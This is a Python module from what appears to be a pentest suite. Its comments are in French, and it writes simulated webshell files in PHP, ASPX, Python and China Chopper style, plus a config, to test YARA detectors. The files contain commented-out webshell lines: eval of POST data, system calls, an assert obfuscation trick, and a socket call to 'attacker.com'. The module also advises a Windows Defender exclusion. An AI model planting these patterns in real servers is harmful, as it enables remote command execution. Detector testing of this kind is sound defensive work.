#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🌐 sim_webshell — Simulation webshells (PHP, ASP, Python)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  FICHIERS DE TEST UNIQUEMENT — AUCUN SERVEUR COMPROMIS
⚠️  MARKERS: KERBEROS_PENTEST_TEST — INOFFENSIF — SAFE
⚠️  Windows Defender : Ajouter exclusion pour payloads_fake/
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Génère signatures webshells réalistes :
- PHP webshell avec eval, system, base64_decode (COMMENTÉS)
- ASPX webshell avec Process.Start (COMMENTÉS)
- Python webshell avec subprocess, socket (COMMENTÉS)
- Config files webshell (JSON)
AUCUN serveur web n'est compromis — signatures uniquement.
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""
import time
import json
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_webshell"
MODULE_LABEL = "Webshell"
_running     = False
_OUT_DIR     = Path(__file__).parent.parent / "payloads_fake" / "webshell"

def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _OUT_DIR.mkdir(parents=True, exist_ok=True)
    
    results = {
        "module":    MODULE_NAME,
        "target":    target,
        "started":   datetime.now().isoformat(),
        "events":    [],
        "files":     [],
        "status":    "running",
    }
    
    def log(msg):
        results["events"].append(msg)
        if callback:
            callback(msg)
    
    log("🌐 Démarrage simulation Webshell...")
    log("⚠️  FICHIERS DE TEST — KERBEROS_PENTEST_TEST — SAFE")
    
    # ── Test 1 : PHP webshell classique ──────────────────────────────
    time.sleep(0.2)
    f1 = _OUT_DIR / "fake_php_webshell.php"
    f1.write_text(
        "<?php\n"
        "// ═══════════════════════════════════════════════════════\n"
        "// ⚠️  KERBEROS PENTEST TEST — FICHIER INOFFENSIF\n"
        "// ⚠️  AUCUNE EXÉCUTION RÉELLE — SIGNATURES SEULEMENT\n"
        "// ⚠️  Windows Defender : Exclusion payloads_fake/\n"
        "// ═══════════════════════════════════════════════════════\n"
        "// TEST_MARKER: KERBEROS_PENTEST_SAFE_FILE\n"
        "// TEST_MARKER: NO_MALICIOUS_CODE_EXECUTED\n"
        "\n"
        "// YARA $web1 : eval(base64_decode — COMMENTÉ\n"
        "// YARA $web2 : system($_POST — COMMENTÉ\n"
        "\n"
        "// Code MALVEILLANT SIMULÉ (jamais exécuté) :\n"
        "// if(isset($_POST['cmd'])) {\n"
        "//     // system($_POST['cmd']);  ← COMMENTÉ — SAFE\n"
        "//     // eval(base64_decode($_POST['data']));  ← COMMENTÉ — SAFE\n"
        "//     echo '[FAKE] command received: ' . $_POST['cmd'];\n"
        "// }\n"
        "\n"
        "// YARA $web3 : preg_replace /e modifier — COMMENTÉ\n"
        "// YARA $web4 : assert + base64 — COMMENTÉ\n"
        "\n"
        "// SAFE_MARKER: THIS_FILE_IS_HARMLESS\n"
        "// SAFE_MARKER: KERBEROS_PENTEST_SUITE_V1\n"
        "\n"
        "echo 'KERBEROS_PENTEST_TEST — webshell simulation only';\n"
        "?>\n",
        encoding="utf-8"
    )
    results["files"].append(str(f1))
    log(f"✅ Créé : {f1.name}")
    log("   → YARA doit détecter : PHP_Webshell_Classic")
    log("   → Defender : markers TEST/SAFE présents")
    
    # ── Test 2 : ASPX webshell ───────────────────────────────────────
    time.sleep(0.2)
    f2 = _OUT_DIR / "fake_aspx_webshell.aspx"
    f2.write_text(
        "<%@ Page Language=\"C#\" %>\n"
        "<%-- ═══════════════════════════════════════════════════════ --%>\n"
        "<%-- ⚠️  KERBEROS PENTEST TEST — FICHIER INOFFENSIF        --%>\n"
        "<%-- ⚠️  AUCUNE EXÉCUTION RÉELLE — SIGNATURES SEULEMENT    --%>\n"
        "<%-- ═══════════════════════════════════════════════════════ --%>\n"
        "<%-- TEST_MARKER: KERBEROS_PENTEST_SAFE_FILE               --%>\n"
        "<%-- YARA $aspx1 : Process.Start — COMMENTÉ                --%>\n"
        "<%-- YARA $aspx2 : Request.Form[\"cmd\"] — COMMENTÉ         --%>\n"
        "\n"
        "<script runat=\"server\">\n"
        "void Page_Load() {\n"
        "    // SAFE_MARKER: NO_REAL_CODE_EXECUTION\n"
        "    string cmd = Request.Form[\"cmd\"];\n"
        "    // System.Diagnostics.Process.Start(cmd);  ← COMMENTÉ\n"
        "    Response.Write(\"[FAKE] ASPX webshell simulation\");\n"
        "}\n"
        "</script>\n"
        "\n"
        "<!-- KERBEROS_PENTEST_TEST -- SAFE FILE -->\n",
        encoding="utf-8"
    )
    results["files"].append(str(f2))
    log(f"✅ Créé : {f2.name}")
    log("   → YARA doit détecter : ASPX_Webshell_Classic")
    
    # ── Test 3 : Python webshell ─────────────────────────────────────
    time.sleep(0.2)
    f3 = _OUT_DIR / "fake_python_webshell.py"
    f3.write_text(
        "#!/usr/bin/env python3\n"
        "# ═══════════════════════════════════════════════════════════\n"
        "# ⚠️  KERBEROS PENTEST TEST — FICHIER INOFFENSIF\n"
        "# ⚠️  AUCUNE EXÉCUTION RÉELLE — SIGNATURES SEULEMENT\n"
        "# ⚠️  Windows Defender : Exclusion payloads_fake/\n"
        "# ═══════════════════════════════════════════════════════════\n"
        "# TEST_MARKER: KERBEROS_PENTEST_SAFE_FILE\n"
        "# TEST_MARKER: NO_MALICIOUS_CODE_EXECUTED\n"
        "# SAFE_MARKER: THIS_FILE_IS_HARMLESS\n"
        "\n"
        "# YARA $pyweb1 : subprocess.run — COMMENTÉ\n"
        "# YARA $pyweb2 : socket.connect — COMMENTÉ\n"
        "# YARA $pyweb3 : http.server + exec — COMMENTÉ\n"
        "\n"
        "import subprocess  # import réel mais JAMAIS exécuté\n"
        "import socket      # import réel mais JAMAIS exécuté\n"
        "from http.server import HTTPServer, BaseHTTPRequestHandler\n"
        "\n"
        "class WebshellHandler(BaseHTTPRequestHandler):\n"
        "    def do_POST(self):\n"
        "        # SAFE_MARKER: FAKE_HANDLER_ONLY\n"
        "        cmd = self.headers.get('X-Command', '')\n"
        "        # subprocess.run(cmd, shell=True)  ← COMMENTÉ — SAFE\n"
        "        # sock = socket.connect(('attacker.com', 4444))  ← COMMENTÉ\n"
        "        self.send_response(200)\n"
        "        self.end_headers()\n"
        "        self.wfile.write(b'[FAKE] Python webshell simulation')\n"
        "\n"
        "# SAFE_MARKER: NEVER_EXECUTED_AUTOMATICALLY\n"
        "if __name__ == '__NEVER__':\n"
        "    # HTTPServer(('0.0.0.0', 8080), WebshellHandler).serve_forever()\n"
        "    print('KERBEROS_PENTEST_TEST — never executed')\n",
        encoding="utf-8"
    )
    results["files"].append(str(f3))
    log(f"✅ Créé : {f3.name}")
    log("   → YARA doit détecter : Python_Webshell_Classic")
    
    # ── Test 4 : China Chopper webshell ──────────────────────────────
    time.sleep(0.2)
    f4 = _OUT_DIR / "fake_china_chopper.php"
    f4.write_text(
        "<?php\n"
        "// ═══════════════════════════════════════════════════════\n"
        "// ⚠️  KERBEROS PENTEST TEST — FICHIER INOFFENSIF\n"
        "// ⚠️  China Chopper SIMULATION — AUCUNE EXÉCUTION\n"
        "// ═══════════════════════════════════════════════════════\n"
        "// TEST_MARKER: KERBEROS_PENTEST_SAFE_FILE\n"
        "// SAFE_MARKER: CHOPPER_SIMULATION_ONLY\n"
        "\n"
        "// YARA $chopper1 : @eval($_POST — COMMENTÉ\n"
        "// YARA $chopper2 : short PHP tags — COMMENTÉ\n"
        "\n"
        "// Mini webshell SIMULÉ (4 bytes payload) — COMMENTÉ\n"
        "// @eval($_POST['x']);  ← COMMENTÉ — SAFE\n"
        "\n"
        "// Obfuscated version SIMULÉE — COMMENTÉ\n"
        "// $a = 'ass'.'ert';  ← COMMENTÉ\n"
        "// $a($_POST['data']);  ← COMMENTÉ\n"
        "\n"
        "// SAFE_MARKER: NO_EVAL_EXECUTED\n"
        "echo 'KERBEROS_PENTEST_TEST — China Chopper simulation';\n"
        "?>\n",
        encoding="utf-8"
    )
    results["files"].append(str(f4))
    log(f"✅ Créé : {f4.name}")
    log("   → YARA doit détecter : China_Chopper_Style")
    
    # ── Test 5 : Webshell config JSON ────────────────────────────────
    time.sleep(0.2)
    f5 = _OUT_DIR / "fake_webshell_config.json"
    config = {
        "type":           "webshell_SIMULATION",
        "test_marker":    "KERBEROS_PENTEST_SAFE_FILE",
        "safe_marker":    "NO_REAL_SERVER_COMPROMISED",
        "languages":      ["php", "aspx", "python", "jsp"],
        "techniques":     ["eval", "system", "exec", "popen", "proc_open"],
        "evasion":        ["base64", "xor_encrypt", "string_concat"],
        "c2_endpoint":    "http://KERBEROS_PENTEST_TEST/beacon",
        "note":           "Simulation inoffensive — AUCUN serveur compromis"
    }
    f5.write_text(json.dumps(config, indent=2), encoding="utf-8")
    results["files"].append(str(f5))
    log(f"✅ Créé : {f5.name}")
    log("   → YARA : Webshell_Config_Pattern")
    
    log(f"📊 {len(results['files'])} fichier(s) webshell créés")
    log("⚠️  IMPORTANT : Ajouter exclusion Defender pour payloads_fake/")
    log("⏳ En attente détection par guard_yara.py + guard_ai_shield.py...")
    
    results["status"]   = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results

def stop():
    global _running
    _running = False

def get_info() -> dict:
    return {
        "name":        MODULE_NAME,
        "label":       MODULE_LABEL,
        "description": "Génère signatures webshells — AUCUN serveur compromis",
        "version":     "1.0",
        "targets":     ["guard_yara.py", "guard_ai_shield.py"],
    }

if __name__ == "__main__":
    result = run()
    print(f"✅ {len(result['files'])} fichiers créés")